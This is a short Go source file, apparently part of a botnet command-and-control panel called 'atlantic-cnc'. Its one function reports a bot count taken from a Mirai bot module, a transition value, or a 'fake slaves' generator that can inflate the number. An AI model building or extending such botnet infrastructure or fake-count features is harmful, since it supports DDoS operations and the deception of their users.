package Slaves

import (
        "atlantic-cnc/core/models/json/build"
        slavesFake "atlantic-cnc/core/slaves/fake"
        slavesMirai "atlantic-cnc/core/slaves/mirai"
        "atlantic-cnc/core/slaves/transition"
        "strconv"
)

func Get() string {
        if build.Config.Slaves.Status {
                return strconv.Itoa(slavesMirai.Count())
        } else if build.Option.SlaveTransition.Status {
                return transition.Count
        } else if build.Option.FakeSlaves.Status {
                return strconv.Itoa(slavesFake.MakeLoop())
        } else {
                return "0"
        }
}
